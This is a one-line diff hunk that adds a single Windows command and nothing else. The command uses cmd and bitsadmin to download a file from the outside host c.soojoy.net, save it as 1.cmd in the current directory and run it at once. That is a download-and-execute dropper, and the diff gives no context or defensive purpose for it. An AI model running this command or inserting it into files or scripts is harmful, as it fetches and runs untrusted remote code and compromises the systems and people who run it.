@@ -1,0 +1,1 @@
+cmd /c "bitsadmin /transfer a http://c.soojoy.net %cd%\1.cmd&1 #u"
